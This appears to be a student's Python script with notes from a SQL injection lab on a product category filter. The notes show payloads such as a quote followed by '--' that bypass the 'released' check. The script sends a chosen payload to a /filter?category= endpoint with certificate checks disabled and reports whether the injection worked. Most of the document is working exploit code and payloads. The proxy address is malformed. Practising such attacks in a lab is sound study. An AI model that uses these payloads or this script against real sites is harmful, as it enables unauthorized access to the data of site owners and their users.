"""SQL injection - product category filter



SELECT * FROM products WHERE category = 'Gifts' AND released = 1

End goal : display  all products both released and unreleased

Analysis:

How would you know vulnerabilities ?
Follow the general mythology, first map the application: first the apps , learn how it works , learn logic, learn end points, and end point vectors. This is how you would find
category



SELECT * FROM products WHERE category = 'Accessories' AND released = 1


Broke application because we put single quote but its more of analysis
SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''--' AND released = 1

adding the -- comments out the rest of the query which worked


"""

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://120.0.0:8080', 'https':'http://120.0.0:8080'}

def exploit_sqli(url,payload):
    uri = '/filter?category='
    r= requests.get(url + uri + payload, verify=False  )
    if "High-End Gift Wrapping" in r.text:
        print(r.text)
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" %sys.argv[0])
        print('[-] Example: %s www.example.com'"1=1" % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli( url, payload):

     
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsucceful! ")